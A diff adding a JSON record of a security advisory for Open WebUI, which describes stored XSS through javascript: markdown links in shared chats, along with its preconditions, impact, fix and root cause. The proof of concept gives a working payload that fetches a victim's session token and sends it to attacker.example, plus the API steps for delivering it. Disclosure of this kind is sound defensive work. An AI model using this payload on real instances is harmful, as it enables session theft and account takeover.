@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-wf9m-46cp-c6h6",
+  "repo": {
+    "cve_id": "CVE-2026-109288",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.4,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "description": "# Viewer session token theft via javascript: URLs in chat message links\r\n\r\n## Summary\r\nAny authenticated user could place a markdown link with a `javascript:` URL in content that another user later views, such as a shared chat. The link was rendered as a clickable anchor with the URL unchanged, because the markdown renderer never checked the link's scheme. When the victim clicked it in an affected browser, the script ran inside Open WebUI in the victim's session and could read their session token.\r\n\r\n## Preconditions\r\n- The attacker has any regular account with the chat sharing permission (`chat.share`, on by default).\r\n- The victim can open the attacker's shared chat: they were granted access to the share, or they are an admin (admins can open any shared chat by default, `ENABLE_ADMIN_CHAT_ACCESS=true`). Channel messages render through the same component when channels are enabled (`ENABLE_CHANNELS`, off by default).\r\n- The victim clicks the link. A plain click triggers it in Safari and every other WebKit browser (which includes every browser on iOS). In Firefox it takes a middle click or a Ctrl/Shift click. Chromium-based browsers do not run it.\r\n- No Content-Security-Policy header is set, which is the default.\r\n\r\n## Impact\r\nThe attacker's script runs in the Open WebUI origin as the victim. It reads the victim's JWT from local storage and sends it to the attacker, who can then use the API with the victim's full permissions. If the victim is an admin, that means the whole instance. The attacker needs the victim to open the shared chat and click the link in an affected browser (see Preconditions). Victims on Chromium-based browsers are not affected, and neither is any deployment that sets a CSP forbidding inline script.\r\n\r\n## Fix\r\nFixed in [#29890](https://github.com/open-webui/open-webui/pull/29890). Before a markdown link is rendered, its URL is now checked, and only http, https, mailto, tel and relative URLs are kept. A link with any other scheme is shown as plain text. Upgrading is enough.\r\n\r\n## Root cause\r\n- Component: the chat markdown link renderer (`src/lib/components/chat/Messages/Markdown/MarkdownInlineTokens.svelte`), and in older releases the `marked.parse` rendering in the response message view.\r\n- Affected setup: every release before 0.11.4.\r\n\r\nLink URLs from the markdown lexer went straight into the anchor's `href`. `marked` does not filter URL schemes, and link tokens skipped DOMPurify (only raw HTML tokens were sanitised), so nothing along the way rejected `javascript:` URLs.\r\n\r\n## Proof of concept\r\nReproduced against the official v0.11.3 image with the default configuration, and checked against v0.11.4.\r\n1. As the admin, create two regular users, attacker and victim.\r\n2. As the attacker, create a chat (`POST /api/v1/chats/new`) whose assistant message contains:\r\n   `[Free GPU credits](jAvascript:fetch('https://attacker.example/leak?t='+localStorage.token))`\r\n3. Share it (`POST /api/v1/chats/{id}/share`) and give the victim read access (`POST /api/v1/chats/shared/{id}/access/update`).\r\n4. As the victim, open `/s/{share_id}` in WebKit and click \"Free GPU credits\". The listener receives the victim's JWT, sent from the Open WebUI origin. The same happens in Firefox with a middle click or Ctrl+click.\r\n5. On v0.11.4 the link renders without an `href`, and clicking it does nothing.\r\n\r\n## Credits\r\n- @r20z19, reporter",
+    "ghsa_id": "GHSA-wf9m-46cp-c6h6",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-wf9m-46cp-c6h6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-wf9m-46cp-c6h6"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-109288"
+      }
+    ],
+    "published_at": "2026-09-27T19:51:36Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Viewer session token theft via javascript: URLs in chat message links",
+    "updated_at": "2026-10-28T20:46:57Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "patched_versions": "0.11.4",
+        "vulnerable_version_range": "< 0.11.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
